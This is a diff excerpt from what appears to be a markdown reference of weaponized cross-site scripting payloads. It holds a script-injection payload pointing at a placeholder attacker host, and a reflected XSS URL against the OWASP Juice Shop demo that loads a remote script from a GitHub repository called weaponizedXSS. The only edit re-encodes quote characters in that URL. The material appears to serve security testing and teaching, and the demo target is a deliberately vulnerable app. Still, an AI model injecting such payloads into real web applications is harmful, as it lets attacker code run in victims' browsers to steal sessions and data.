@@ -38,7 +38,7 @@ with(document)body.appendChild(createElement('script')).src='//ATTACKER_WS/PATH/
 
 * *(live example - OWASP juice shop - reflected XSS)*
 
-    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement('script')).src%3D'%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js';%22%3E
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement(%27script%27)).src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27%3B%22%3E
 
 ## `appendChild()` #2 - round brackets; quote; equal; space
 
